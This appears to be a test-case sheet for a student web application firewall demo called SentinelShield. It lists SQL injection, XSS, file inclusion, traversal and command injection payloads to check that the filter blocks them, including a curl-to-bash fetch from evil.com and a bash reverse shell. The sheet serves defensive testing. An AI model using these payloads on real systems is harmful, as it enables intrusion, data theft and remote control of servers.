# SentinelShield — Sample Attack Test Cases
# ============================================================================
# Use these payloads on the Test Requests page at http://127.0.0.1:5000/test
# All payloads are safe for DEMO/TESTING only — nothing is executed.
# ============================================================================

---

## ✅ NORMAL (Safe) Requests — Should be ALLOWED

| # | Payload | Expected Result |
|---|---------|----------------|
| 1 | `Hello, my name is Alice` | ✅ ALLOWED |
| 2 | `weather forecast for tomorrow` | ✅ ALLOWED |
| 3 | `product_id=123&category=electronics` | ✅ ALLOWED |
| 4 | `username=john&email=john@example.com` | ✅ ALLOWED |
| 5 | `The price is $5.99` | ✅ ALLOWED |

---

## 🔴 SQL INJECTION — Should be BLOCKED (CRITICAL)

SQL Injection attempts to manipulate database queries by inserting SQL syntax
into user-controlled input fields.

| # | Payload | Detection Trigger |
|---|---------|------------------|
| 1 | `' OR '1'='1` | OR bypass pattern |
| 2 | `1; DROP TABLE users--` | Statement terminator + DROP |
| 3 | `UNION SELECT username, password FROM users` | UNION SELECT keyword |
| 4 | `1' AND SLEEP(5)--` | Time-based blind SQLi |
| 5 | `1' AND (SELECT * FROM INFORMATION_SCHEMA.TABLES)--` | Schema enumeration |
| 6 | `admin'--` | Comment-based bypass |
| 7 | `1 WAITFOR DELAY '0:0:5'--` | MSSQL time delay |

**Why this is dangerous:**
SQL Injection can allow attackers to:
- Bypass login authentication
- Dump the entire database
- Delete or modify database records
- Execute OS commands (via xp_cmdshell on MSSQL)

---

## 🟠 CROSS-SITE SCRIPTING (XSS) — Should be BLOCKED (HIGH)

XSS injects malicious JavaScript into web pages viewed by other users,
enabling session hijacking, credential theft, and defacement.

| # | Payload | Detection Trigger |
|---|---------|------------------|
| 1 | `<script>alert('XSS')</script>` | `<script>` tag |
| 2 | `<img src=x onerror=alert(document.cookie)>` | Event handler injection |
| 3 | `javascript:alert(1)` | javascript: protocol |
| 4 | `<svg onload=alert(1)>` | SVG event handler |
| 5 | `<iframe src="javascript:alert('xss')">` | iframe injection |
| 6 | `"><script>document.location='http://evil.com'</script>` | Redirect injection |
| 7 | `%3Cscript%3Ealert(1)%3C%2Fscript%3E` | URL-encoded XSS |

**Why this is dangerous:**
XSS allows attackers to:
- Steal session cookies and impersonate users
- Redirect victims to phishing pages
- Perform actions on behalf of victims
- Log keystrokes

---

## 🟡 LOCAL FILE INCLUSION (LFI) — Should be BLOCKED (CRITICAL)

LFI exploits allow reading sensitive files from the server's filesystem
by manipulating file path parameters.

| # | Payload | Detection Trigger |
|---|---------|------------------|
| 1 | `../../../../etc/passwd` | /etc/passwd pattern |
| 2 | `php://filter/convert.base64-encode/resource=index.php` | PHP wrapper |
| 3 | `....//....//etc/shadow` | Obfuscated traversal |
| 4 | `/proc/self/environ` | Process environment file |
| 5 | `C:\\Windows\\System32\\drivers\\etc\\hosts` | Windows system file |
| 6 | `/var/log/apache2/access.log` | Log file access |

**Why this is dangerous:**
LFI can allow attackers to:
- Read /etc/passwd to enumerate system users
- Access SSH private keys
- Read application source code and config files
- Escalate to Remote Code Execution via log poisoning

---

## 🟣 DIRECTORY TRAVERSAL — Should be BLOCKED (HIGH)

Directory Traversal navigates outside the web root directory using
`../` sequences to access unauthorized files.

| # | Payload | Detection Trigger |
|---|---------|------------------|
| 1 | `../../../windows/system32` | Multiple ../ sequences |
| 2 | `..%2F..%2F..%2Fetc%2Fpasswd` | URL-encoded traversal |
| 3 | `....//....//....//etc/hosts` | Obfuscated traversal |
| 4 | `%252e%252e%252fetc%252fpasswd` | Double URL-encoded |
| 5 | `..;/..;/..;/etc/passwd` | Semicolon bypass |

**Why this is dangerous:**
- Access files outside the intended web directory
- Read server configuration files
- Access backup files and credentials
- Combined with LFI for full filesystem access

---

## 🔥 COMMAND INJECTION — Should be BLOCKED (CRITICAL)

Command Injection inserts OS shell commands into input that gets
executed by the server, giving full system access.

| # | Payload | Detection Trigger |
|---|---------|------------------|
| 1 | `; ls -la /etc` | Semicolon + shell command |
| 2 | `| cat /etc/passwd` | Pipe + shell command |
| 3 | `&& whoami` | AND operator + command |
| 4 | `` $(curl http://evil.com/shell.sh | bash) `` | Command substitution |
| 5 | `ping -c 4 127.0.0.1` | Network utility |
| 6 | `; python3 -c "import os; os.system('id')"` | Python execution |
| 7 | `; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` | Reverse shell |

**Why this is dangerous:**
Command Injection is one of the most severe vulnerabilities:
- Full OS command execution as the web server user
- Ability to create reverse shells
- Data exfiltration
- Lateral movement through the network

---

## ⏱️ RATE LIMITING TEST — Triggers RATE_LIMITED

To test rate limiting:
1. Go to the Test Requests page
2. Submit **more than 30 requests within 60 seconds**
3. After the 20th request you'll see SUSPICIOUS status
4. After the 30th request your IP will be BANNED for 5 minutes

Alternatively, use this curl command (run in terminal — NOT in the app):
```bash
# Submit 35 rapid requests (adjust URL if needed)
for i in $(seq 1 35); do
    curl -X POST http://127.0.0.1:5000/analyze \
         -d "method=GET&path=/test&payload=hello$i" \
         -s > /dev/null
    echo "Request $i sent"
done
```

---

## 📊 Demonstration Script (for Viva/Demo)

Follow this sequence to demonstrate all features:

### Step 1: Clean Start
- Click "Reset Logs" on the dashboard
- Show empty stats (0/0/0)

### Step 2: Normal Traffic
- Submit 3–4 normal requests from the Test page
- Show "ALLOWED" results
- Show dashboard updating

### Step 3: SQL Injection Demo
- Submit: `' OR '1'='1`
- Show BLOCKED result, CRITICAL severity
- Explain: "This would bypass a login form in a vulnerable app"

### Step 4: XSS Demo
- Submit: `<script>alert(document.cookie)</script>`
- Show BLOCKED result, HIGH severity
- Explain: "This steals session cookies from other users"

### Step 5: LFI Demo
- Submit: `../../../../etc/passwd`
- Show BLOCKED result, CRITICAL severity
- Explain: "This reads Linux user credentials from the server"

### Step 6: Command Injection Demo
- Submit: `; cat /etc/passwd`
- Show BLOCKED result, CRITICAL severity

### Step 7: Check Dashboard
- Navigate to Dashboard
- Show attack breakdown chart
- Show flagged IPs
- Show severity distribution

### Step 8: Check Logs
- Navigate to Logs
- Filter by BLOCKED
- Show log entries with timestamps and categories

### Step 9: Generate Report
- Navigate to Report
- Show summary, recommendations
- Print/export for submission